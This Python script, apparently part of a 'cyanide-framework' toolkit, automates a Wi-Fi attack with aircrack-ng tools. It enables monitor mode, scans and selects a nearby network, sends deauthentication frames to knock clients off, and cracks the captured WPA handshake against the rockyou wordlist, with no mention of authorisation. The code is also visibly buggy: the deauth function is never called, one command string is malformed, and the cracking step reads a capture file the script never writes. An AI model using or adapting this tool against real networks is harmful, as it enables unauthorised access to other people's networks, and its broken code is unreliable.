#!/usr/bin/env python
import subprocess
import os
import time
import string
import csv

dev_list = [] # to create file
dev_list_1 = [] # final device list
dev_list_2 = [] # Dumped list
dev_list_3 = [] # Dumped list 2

def return_fw():
    bashCommand = ". ./cyanide-framework.sh && main"
    subprocess.call(['bash','-c', bashCommand])

def get_dev():
    count = 1

    global lele
    command = "ip -br link show | awk '{print $1}'"
    qwerty = subprocess.check_output(['bash', '-c', command]).decode("utf-8")
    dev_list.append(qwerty)
    f = open("devlist.txt", "w")
    for i in dev_list:
        f.write(i)
    f.close()
    y = open("devlist.txt", "r")
    for x in y:
        dev_list_1.append(x)
        print(count, ")", x)
        count += 1
    y.close()
    lele = len(dev_list_1)

def choosing_and_monitoring():
    get_dev()
    global option
    print("Enter the Option 1 -",lele," :")
    option = int(input("Option: "))
    if option <= lele:
        iface = dev_list_1[option - 1]
        print(type(iface))
        print(iface)
        cmd_1 = "airmon-ng start" + " " + iface
        subprocess.run(["bash", "-c", cmd_1])

    elif (option <= 0) or (option > lele) :
        print("[-]Wrong Option. Please Try Again")
        choosing_and_monitoring()
    # going in monitor mode


def list_empty():
    dev_list.clear()
    dev_list_1.clear()

def dumping():
    count = 0
    global bssid
    global channel
    global iface_1

    iface_1 = dev_list_1[option-1]
    cmd_dump = 'xterm -T "Dumping Networks" -fa monaco -fs 13 -bg red -e "airodump-ng ' + iface_1 + ' -w output --output-format csv"'
    subprocess.call(['bash', '-c', cmd_dump])
    csv_file = open("output-01.csv", "r")
    csv_read = csv.reader(csv_file)
    for i in csv_read:
        if len(i) != 0:
            dev_list_2.append(i)

    for j in range(len(dev_list_2) - 4):
        if dev_list_2[j][13] != " ":
            a = dev_list_2[j][13]
            b = dev_list_2[j][0]
            c = dev_list_2[j][3]
            print("%d, %-15s, %-15s, %-6s" %(count, a,b,c))
            count += 1

    print("Please Select the Network in Your Area: ")
    option_2 = int(input("Enter the Serial Number: "))
    if (option_2 <=0) or (option_2 >=len(dev_list_2)-4):
        print("[-] Wrong Option. Please Try Again :( ")
        dumping()
    elif (option_2 >0) or (option_2 <=len(dev_list_2)-4):
        bssid = dev_list_2[option_2][0]
        channel = dev_list_2[option_2][3]
        cmd_dump_1 = 'xterm -T "Dumping Specific Network" -fa monaco -fs 13 -bg red -e "airodump-ng --bssid '+ bssid + ' --channel' + channel + " " + iface_1 + ' -w output_2 --output-format csv"'
        subprocess.call(['bash', '-c', cmd_dump_1])


def lets_play():
    cmd_play = 'xterm -T "Dumping Specific Network" -fa monaco -fs 13 -bg red -e "aireplay-ng -0 100 -a '+ bssid + iface_1
    subprocess.call(["bash","-c",cmd_play])

def pass_crack():
    cmd = 'xterm -T "Cr4cKinG PasSw0rD" -fa monaco -fs 13 -bg red -e "aircrack-ng hack1-01.cap -w /usr/share/wordlists/rockyou.txt -l keyfound.txt"'
    subprocess.call(["bash", "-c", cmd])
    cmd_rmv = "rm -rf hack1-*"
    subprocess.call(["bash", "-c", cmd_rmv])
    cmd_shw_key = "cat keyfound.txt"
    subprocess.call(["bash", "-c", cmd_shw_key])

try:
    print("[*] There are the following Network Interfaces")
    choosing_and_monitoring()
    print("[*] Monitor Mode Achieved")
    time.sleep(4.5)
    dumping()
except KeyboardInterrupt:
    return_fw()

pass_crack()
